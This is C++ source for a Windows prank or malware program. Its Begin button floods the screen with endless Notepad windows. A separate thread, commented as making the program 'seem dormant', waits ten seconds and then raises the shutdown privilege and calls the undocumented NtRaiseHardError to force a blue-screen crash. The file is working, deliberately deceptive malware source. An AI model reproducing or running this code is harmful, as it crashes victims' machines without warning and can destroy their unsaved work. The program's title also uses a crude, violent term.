// NTPD Rape Reborn.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "NTPD Rape Reborn.h"
#include <process.h>
#include <shellapi.h>
#include <winternl.h>


#define MAX_LOADSTRING 100

// Global Variables:
int TotalInstances;
BOOL Running;
HINSTANCE hInst;								// current instance
HWND Btn;
HWND hWnd;
TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name

// Forward declarations of functions included in this code module:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	NTPDRape(HWND, UINT, WPARAM, LPARAM);
UINT 				__stdcall InvokeNotepad(void *);
UINT				__stdcall BSODThread(void *);

// Undocumented Win32 API
typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);


int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	DialogBoxParamA(hInst, MAKEINTRESOURCEA(IDD_MAIN), hWnd, NTPDRape, 0);
}


INT_PTR CALLBACK NTPDRape(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	tagRECT *lpRect;
	tagRECT Rect1;
	tagRECT Rect2;

	hWnd = hDlg;
	lpRect = &Rect2;
	
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		
		hWnd = GetDesktopWindow();
		GetWindowRect(hWnd, lpRect);
		GetWindowRect(hDlg, &Rect1);

		// Set Window Position To Center Of Screen
		SetWindowPos(hDlg,NULL,
                 (Rect2.right + Rect2.left) / 2 - (Rect1.right - Rect1.left) / 2,
                 (Rect2.top + Rect2.bottom) / 2 - (Rect1.bottom - Rect1.top) / 2,0,0,1);
				
		Btn = GetDlgItem(hDlg, BeginEndButton);

		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		
		if (LOWORD(wParam) == BeginEndButton)
		{
			if (IsDlgButtonChecked(hDlg, DisableButton) == BST_CHECKED)
				EnableWindow(Btn, 0);

			if (Running == FALSE)
			{
				Running = TRUE;
				SetDlgItemTextA(hDlg, BeginEndButton, "End");
				_beginthreadex(NULL, 0, BSODThread, NULL, 0, 0);
				_beginthreadex(NULL, 0, InvokeNotepad, NULL, 0, 0);
				_beginthreadex(NULL, 0, InvokeNotepad, NULL, 0, 0);
				_beginthreadex(NULL, 0, InvokeNotepad, NULL, 0, 0);
				_beginthreadex(NULL, 0, InvokeNotepad, NULL, 0, 0);
				_beginthreadex(NULL, 0, InvokeNotepad, NULL, 0, 0);
			}

			else
			{
				Running = FALSE;
				SetDlgItemTextA(hDlg, BeginEndButton, "Begin");
			}
			
		}
		break;
	}
	return (INT_PTR)FALSE;
}

UINT __stdcall InvokeNotepad(void *)
{

	do
	{
		ShellExecuteA(hWnd, "open", "notepad.exe", NULL, NULL, SW_SHOW);
		TotalInstances = TotalInstances + 1;
		SetDlgItemInt(hWnd, Instances, TotalInstances, 0);
		OutputDebugStringA("Invoke Notepad");
	} while (Running == TRUE);

	return 0;
}

UINT __stdcall BSODThread(void *)
{
	HMODULE hMod;
	BOOLEAN bl;
	ULONG Response;

	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");

	/* 
	 * Make it seem dormant
	 */
	Sleep(10000);

	/* 
	 * Then BSOD here
	 */
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bl); 
    NtCall2(STATUS_ACCESS_VIOLATION, 0, 0, 0, 6, &Response);

	return 0;
}
